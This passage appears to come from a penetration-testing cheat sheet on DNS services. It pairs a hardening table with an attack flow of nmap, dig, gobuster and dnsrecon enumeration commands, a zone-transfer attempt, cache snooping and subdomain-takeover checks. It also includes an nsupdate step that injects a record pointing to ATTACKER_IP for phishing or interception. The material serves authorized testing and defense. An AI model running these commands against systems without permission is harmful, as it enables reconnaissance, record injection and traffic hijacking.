  | Zone transfer to any | Restrict AXFR: `allow-transfer { trusted-servers; };` | 🔴 Critical |
  | Open recursion | Disable or restrict: `allow-recursion { internal-nets; };` | 🔴 Critical |
  | Dynamic updates allowed | Require TSIG authentication: `allow-update { key "update-key"; };` | 🔴 Critical |
  | Version disclosure | Hide version: `version "not disclosed";` | 🟡 Medium |
  | No DNSSEC | Implement DNSSEC zone signing | 🟠 High |
  | No SPF record | Add: `v=spf1 mx -all` | 🔴 Critical |
  | No DMARC | Add: `v=DMARC1; p=reject; rua=mailto:dmarc@domain.com` | 🔴 Critical |
  | No DKIM | Configure DKIM signing for outbound email | 🟠 High |
  | Outdated DNS software | Update BIND/dnsmasq/PowerDNS to latest version | 🔴 Critical |
  | Sensitive data in TXT records | Audit TXT records, remove unnecessary entries | 🟠 High |
  | Dangling CNAMEs | Audit CNAME records, remove orphaned entries | 🟠 High |
  | No query logging | Enable query logging for security monitoring | 🟡 Medium |
  | No rate limiting | Implement `rate-limit` in BIND or response rate limiting | 🟡 Medium |
  | DNS on TCP exposed | Restrict TCP port 53 to known secondary servers | 🟡 Medium |

## Attack Flow Diagram

::steps{level="4"}

#### Discovery & Version Detection

```bash [Terminal]
nmap -sU -sT -p 53 -sV $IP
dig @$IP version.bind chaos txt +short
```
→ **Identify software** → Search CVEs (SIGRed, BIND vulns, dnsmasq)

#### Zone Transfer Attempt

```bash [Terminal]
dig @$IP target.com AXFR
```
→ **Success?** → Complete infrastructure map obtained!
→ **Failed?** → Proceed to brute force and passive recon

#### Record Enumeration

```bash [Terminal]
dig @$IP target.com ANY
dig @$IP target.com NS MX TXT SOA SRV
dig @$IP _dmarc.target.com TXT
```
→ **MX records** → Target SMTP (Port 25)
→ **SRV records** → Discover AD infrastructure
→ **TXT records** → Check SPF/DMARC for spoofing

#### Subdomain Discovery

```bash [Terminal]
# Passive (no queries to target)
subfinder -d target.com
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq

# Active brute force
gobuster dns -d target.com -w wordlist.txt -r $IP:53
```
→ **New subdomains** → Expand attack surface, test each

#### Reverse DNS Sweep

```bash [Terminal]
dnsrecon -r 10.10.10.0/24 -n $IP
```
→ **Internal hostnames** → Map infrastructure

#### Recursion & Cache Analysis

```bash [Terminal]
dig @$IP www.google.com A          # Recursion check
dig @$IP internal.target.com +norecurse  # Cache snoop
```
→ **Open resolver?** → Cache snooping, amplification finding
→ **Cached internal domains?** → Intelligence on internal activity

#### Dynamic Update Test

```bash [Terminal]
nsupdate << EOF
server $IP
zone target.com
update add evil.target.com 86400 A ATTACKER_IP
send
EOF
```
→ **Update accepted?** → Inject records for phishing/MITM

#### Subdomain Takeover Check

```bash [Terminal]
# Check for dangling CNAMEs
subjack -w discovered_subdomains.txt -c fingerprints.json
```
→ **Vulnerable CNAME?** → Register service, control subdomain
